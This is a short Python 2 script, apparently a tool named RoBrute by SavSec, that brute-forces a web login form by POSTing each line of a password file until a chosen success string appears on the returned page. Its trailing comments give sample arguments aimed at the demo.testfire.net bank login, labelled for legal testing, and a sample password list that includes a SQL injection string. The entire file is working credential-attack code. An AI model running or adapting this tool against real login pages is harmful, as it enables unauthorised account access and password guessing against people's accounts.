import time, requests, sys, time
from datetime import timedelta
import RoBruteLogo
time.sleep(2)
try:
	url = str(sys.argv[1])
	uid = str(sys.argv[2])
	pid = str(sys.argv[3])
	lkf = str(sys.argv[4])
	usr = str(sys.argv[5])
	pwd = str(sys.argv[6])
except:
	print "\t\t\t  Arguments:\n\t\t\t\t <url>\n\t\t  <user_textbox_id>\n\t\t  <pass_textbox_id>\n\t <words_on_successful_page>\n\t <username> <password_file>\n"
	time.sleep(1)
	print "              SavSec\n"
	time.sleep(1)
	print "          Your Arguments\n"
	time.sleep(1)
	try:
		test = url
	except:
		url = "[missing]"
		pass
	try:
		test = uid
	except:
		uid = "[missig]"
		pass
	try:
		test = pid
	except:
		pid = "[missing]"
		pass
	try:
		test = lkf
	except:
		lkf = "[missing]"
		pass
	try:
		test = usr
	except:
		usr = "[missing]"
		pass
	try:
		test = pwd
	except:
		pwd = "[missing]"
		pass
	print "URL: %s" % url
	print "USER ID: %s" % uid
	print "PASS ID: %s" % pid
	print "SEARCH: %s" % lkf
	print "USER: %s" % usr
	print "FILE: %s" % pwd
	sys.exit()
start_time = time.time()
f = open(pwd,"r")
num = sum(1 for line in open('passes.txt'))
print "       Passwords Loaded:", num
print " "
for i in range(num):
	pwd = f.readline().replace("\n","")
	values = {uid : usr, pid : pwd}
	r = requests.post(url, data=values)
	info = r.content.find(lkf)
	sys.stdout.write("\r              Running")
	sys.stdout.flush()
	if info > 2:
		sys.stdout.write("\r            " + pwd + "\n")
		elapsed_time = time.time() - start_time
		print ""
		time.sleep(3)
		times = str(timedelta(seconds=elapsed_time))
		print "   Time Elapsed:", str(times)
		sys.exit()

# Pre-Set Arguments (Legal Testing)
"""
http://demo.testfire.net/bank/login.aspx uid passw Welcome admin passes.txt
"""
# passes.txt:
"""
1
2
3
4
5
6
7
8
9
'or 1=1 -- 
10
11
12
13
14
"""
